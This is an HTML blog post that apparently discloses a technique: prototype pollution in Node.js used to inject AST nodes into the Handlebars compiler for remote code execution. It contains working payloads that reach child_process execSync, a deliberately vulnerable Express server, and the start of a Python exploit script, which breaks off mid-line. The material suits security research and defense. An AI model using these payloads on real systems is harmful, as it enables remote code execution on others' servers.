<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="This article describes how to trigger RCEin two well-known template engines,using a new technique called AST Injection.  AST InjectionWhat is AST? https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Abstract_syntax_tree"><meta property="og:type" content="article"><meta property="og:title" content="AST Injection, Prototype Pollution to RCE"><meta property="og:url" content="https://blog.p6.is/AST-Injection/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="This article describes how to trigger RCEin two well-known template engines,using a new technique called AST Injection.  AST InjectionWhat is AST? https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Abstract_syntax_tree"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.p6.is/img/2020/08/graph_2.png"><meta property="og:image" content="https://blog.p6.is/img/2020/08/graph_3.jpg"><meta property="og:image" content="https://blog.p6.is/img/2020/08/graph_4.jpg"><meta property="og:image" content="https://blog.p6.is/img/2020/08/graph_5.jpg"><meta property="og:image" content="https://blog.p6.is/img/2020/08/graph_6.png"><meta property="og:image" content="https://blog.p6.is/img/2020/08/pic_1.png"><meta property="og:image" content="https://blog.p6.is/img/2020/08/graph_7.png"><meta property="og:image" content="https://blog.p6.is/img/2020/08/graph_8.jpg"><meta property="og:image" content="https://blog.p6.is/img/2020/08/pic_2.png"><meta property="article:published_time" content="2020-08-04T13:42:34.000Z"><meta property="article:modified_time" content="2022-10-14T13:04:25.645Z"><meta property="article:author" content="posix"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.p6.is/img/2020/08/graph_2.png"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>AST Injection, Prototype Pollution to RCE</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="/Abusing-Environment-Variables/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/Real-World-JS-1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/AST-Injection/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/AST-Injection/&text=AST Injection, Prototype Pollution to RCE"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AST-Injection"><span class="toc-number">1.</span> <span class="toc-text">AST Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-AST"><span class="toc-number">1.1.</span> <span class="toc-text">What is AST?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AST-in-NodeJS"><span class="toc-number">1.2.</span> <span class="toc-text">AST in NodeJS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Handlebars"><span class="toc-number">2.</span> <span class="toc-text">Handlebars</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-Detect"><span class="toc-number">2.1.</span> <span class="toc-text">How to Detect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-number">2.3.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pug"><span class="toc-number">3.</span> <span class="toc-text">Pug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-Detect-1"><span class="toc-number">3.1.</span> <span class="toc-text">How to Detect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-1"><span class="toc-number">3.3.</span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">4.</span> <span class="toc-text">Conclusion</span></a></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">AST Injection, Prototype Pollution to RCE</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-08-04T13:42:34.000Z" itemprop="datePublished">2020-08-04</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/docs/">Docs</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><blockquote><p>This article describes how to trigger RCE<br>in two well-known template engines,<br>using a new technique called AST Injection.</p></blockquote><h2 id="AST-Injection"><a href="#AST-Injection" class="headerlink" title="AST Injection"></a>AST Injection</h2><h3 id="What-is-AST"><a href="#What-is-AST" class="headerlink" title="What is AST?"></a>What is AST?</h3><blockquote><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">https://en.wikipedia.org/wiki/Abstract_syntax_tree</a></p></blockquote><h3 id="AST-in-NodeJS"><a href="#AST-in-NodeJS" class="headerlink" title="AST in NodeJS"></a>AST in NodeJS</h3><p><img src="/img/2020/08/graph_2.png" alt="img"></p><p>In NodeJS, AST is used in JS really often, as template engines and typescript etc.<br>For the template engine, the structure is as shown above.</p><p><img src="/img/2020/08/graph_3.jpg" alt="img"></p><p>If prototype pollution vulnerability exists in the JS application,<br>Any AST can be inserted in the function by making it insert during the <code>Parser</code> or <code>Compiler</code> process.</p><p>Here, you can insert AST without proper filtering of input (which has not been properly filtered) that has not been verified by lexer or parser.<br>Then, we can give unexpected input to the compiler.</p><p>Below is how to actually use AST Injection to execute arbitrary commands in <code>handlebars</code> and <code>pug</code></p><h2 id="Handlebars"><a href="#Handlebars" class="headerlink" title="Handlebars"></a>Handlebars</h2><p><img src="/img/2020/08/graph_4.jpg" alt="img"></p><p>Until today, <code>handlebars</code> has been downloaded a total of <code>998,602,213</code> times.<br>Handlebars are the most commonly used template engine except for ejs.</p><p>For newer versions, it is known to be safe because no command can be executed, even if any template can be inserted.</p><h3 id="How-to-Detect"><a href="#How-to-Detect" class="headerlink" title="How to Detect"></a>How to Detect</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;posix&quot;</span>&#125;)); <span class="comment">// Hello posix</span></span><br></pre></td></tr></table></figure><p>Before you start, here’s how to use templates in handlebars.<br>The Handlebar.compile function converts a string into a template function and passes object factors for reference.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pendingContent</span> = <span class="string">`&lt;script&gt;alert(origin)&lt;/script&gt;`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;posix&quot;</span>&#125;)); <span class="comment">// &lt;script&gt;alert(origin)&lt;/script&gt;Hello posix</span></span><br></pre></td></tr></table></figure><p>In here, we can make influence to the compilation process using prototype pollution.</p><p>You can insert any string into <code>Object.prototype.pendingContent</code> to determine the possibility of an attack.<br>This allows you to be sure that servers are using handlebars engine when a prototype pollution exists in a black-box environment.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/javascript-compiler.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="attr">appendContent</span>: <span class="keyword">function</span> <span class="title function_">appendContent</span>(<span class="params">content</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">pendingContent</span>) &#123;</span><br><span class="line">		content = <span class="variable language_">this</span>.<span class="property">pendingContent</span> + content;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">pendingLocation</span> = <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">pendingContent</span> = content;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">pushSource</span>: <span class="keyword">function</span> <span class="title function_">pushSource</span>(<span class="params">source</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">pendingContent</span>) &#123;</span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(<span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">quotedString</span>(<span class="variable language_">this</span>.<span class="property">pendingContent</span>), <span class="variable language_">this</span>.<span class="property">pendingLocation</span>));</span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">pendingContent</span> = <span class="literal">undefined</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (source) &#123;</span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">push</span>(source);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>This is done by the <code>appendContent</code> function of <code>javascript-compiler.js</code><br><code>appendContent</code> is this.If <code>pendingContent</code> is present, append to the content and returns.</p><p><code>pushSource</code> makes the <code>pendingContent</code> to <code>undefined</code>, preventing the string from being inserted multiple times.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p><img src="/img/2020/08/graph_5.jpg" alt="img"></p><p>Handlebars work as shown in the graph above.</p><p>After lexer and parser generater AST, It passes to <code>compiler.js</code><br>We can run the template function compiler generated with some arguments.<br>and It returns the string like “Hello posix” (when msg is posix)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/parser.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$</span> = &#123; <span class="attr">type</span>: <span class="string">&#x27;NumberLiteral&#x27;</span>, <span class="attr">value</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">original</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">loc</span>: yy.<span class="title function_">locInfo</span>(<span class="variable language_">this</span>.<span class="property">_$</span>) &#125;;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>The parser in handlebars forces the value of a node whose type is NumberLiteral to always be a number through the Number constructor.<br>However, you can insert a non-numeric string here using the prototype pollution.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/base.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseWithoutProcessing</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="comment">// Just return if an already-compiled AST was passed in.</span></span><br><span class="line">  <span class="keyword">if</span> (input.<span class="property">type</span> === <span class="string">&#x27;Program&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="property">yy</span> = yy;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Altering the shared object here, but this is ok as parser is a sync operation</span></span><br><span class="line">  yy.<span class="property">locInfo</span> = <span class="keyword">function</span> (<span class="params">locInfo</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> yy.<span class="title class_">SourceLocation</span>(options &amp;&amp; options.<span class="property">srcName</span>, locInfo);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> ast = _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="title function_">parse</span>(input);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ast;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> ast = <span class="title function_">parseWithoutProcessing</span>(input, options);</span><br><span class="line">  <span class="keyword">var</span> strip = <span class="keyword">new</span> _whitespaceControl2[<span class="string">&#x27;default&#x27;</span>](options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> strip.<span class="title function_">accept</span>(ast);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>First, look at the compile function, and it supports two ways of input, AST Object and template string.</p><p>when input.type is a <code>Program</code>, although the input value is actually string.<br>Parser considers it’s already AST parsed by parser.js and send it to the compiler without any processing.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/compiler.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">node</span>) &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[node.<span class="property">type</span>]) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + node.<span class="property">type</span>, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">unshift</span>(node);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[node.<span class="property">type</span>](node);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title class_">Program</span>: <span class="keyword">function</span> <span class="title function_">Program</span>(<span class="params">program</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="keyword">new</span> <span class="title class_">Error</span>).<span class="property">stack</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">unshift</span>(program.<span class="property">blockParams</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> body = program.<span class="property">body</span>,</span><br><span class="line">        bodyLength = body.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bodyLength; i++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">accept</span>(body[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isSimple</span> = bodyLength === <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">blockParams</span> = program.<span class="property">blockParams</span> ? program.<span class="property">blockParams</span>.<span class="property">length</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>The compiler given the AST Object (actually a string) send it to the <code>accept</code> method.<br>and <code>accept</code> calls <code>this[node.type]</code> of Compiler.<br>Then take body attribute of AST and use it for constructing function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;start&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;end&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">precompile</span>(source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + template + <span class="string">&#x27;)&#x27;</span>)[<span class="string">&#x27;main&#x27;</span>].<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function (container, depth0, helpers, partials, data) &#123;</span></span><br><span class="line"><span class="comment">    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) &#123;</span></span><br><span class="line"><span class="comment">        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) &#123;</span></span><br><span class="line"><span class="comment">            return parent[propertyName];</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return undefined</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    return ((stack1 = (lookupProperty(helpers, &quot;undefined&quot;) || (depth0 &amp;&amp; lookupProperty(depth0, &quot;undefined&quot;)) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || &#123;&#125;), console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString()), &#123;</span></span><br><span class="line"><span class="comment">        &quot;name&quot;: &quot;undefined&quot;,</span></span><br><span class="line"><span class="comment">        &quot;hash&quot;: &#123;&#125;,</span></span><br><span class="line"><span class="comment">        &quot;data&quot;: data,</span></span><br><span class="line"><span class="comment">        &quot;loc&quot;: &#123;</span></span><br><span class="line"><span class="comment">            &quot;start&quot;: 0,</span></span><br><span class="line"><span class="comment">            &quot;end&quot;: 0</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;)) != null ? stack1 : &quot;&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>As a result, an attack can be configured like this.<br>If you have gone through parser, specify a string that cannot be assigned to the value of NumberLiteral.<br>But Injected AST processed, we can insert any code into the function.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125; = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span>  = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vulnerable&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> object = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    res.<span class="title function_">json</span>(object);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>Example of configuring a vulnerable server using a flat module it has prototype pollution vulnerability.</p><p><img src="/img/2020/08/graph_6.png" alt="img"></p><p>The flat is a popular module with 4.61 million downloads per week<br>the patch for the prototype pollution vulnerablity reported has not yet been made.</p><blockquote><p><a target="_blank" rel="noopener" href="https://github.com/hughsk/flat/issues/105">https://github.com/hughsk/flat/issues/105</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&#x27;http://p6.is:3000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make pollution</span></span><br><span class="line">requests.post(TARGET_URL + <span class="string">&#x27;/vulnerable&#x27;</span>, json = &#123;</span><br><span class="line">    <span class="string">&quot;__proto__.type&quot;</span>: <span class="string">&quot;Program&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__.body&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span 